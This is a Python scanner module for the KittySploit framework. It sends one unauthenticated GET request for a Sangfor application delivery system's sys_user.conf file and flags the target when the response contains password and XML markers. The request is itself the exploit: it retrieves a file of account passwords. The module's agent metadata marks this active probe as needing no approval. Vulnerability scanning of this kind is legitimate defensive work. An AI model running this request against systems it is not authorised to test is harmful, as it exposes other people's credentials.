#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Sangfor application delivery management system file sys_user."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Sangfor Application sys_user.conf Account Password Leakage Detection',
        'description': 'Sangfor application delivery management system file sys_user.conf can be directly accessed without authorization, resulting in leakage of account and password',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'vulnerability', 'lfi', 'sangfor', 'exposure', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/Threekiii/Awesome-POC/blob/master/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E6%B7%B1%E4%BF%A1%E6%9C%8D%20%E5%BA%94%E7%94%A8%E4%BA%A4%E4%BB%98%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20sys_user.conf%20%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E.md',
            'https://github.com/achuna33/MYExploit/blob/master/src/main/java/com/achuna33/Controllers/SangForController.java',
        ],
    }

    def run(self):
        r = self.http_request(method="GET", path='/tmp/updateme/sinfor/ad/sys/sys_user.conf', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        # Require Sangfor conf markers (password field + XML header).
        body_all = ('密码', '<?xml version=')
        if all(m in body for m in body_all):
            self.set_info(
                severity='high',
                reason="Sangfor Application sys_user.conf Account Password Leakage detected",
                path='/tmp/updateme/sinfor/ad/sys/sys_user.conf',
            )
            return True
        return False

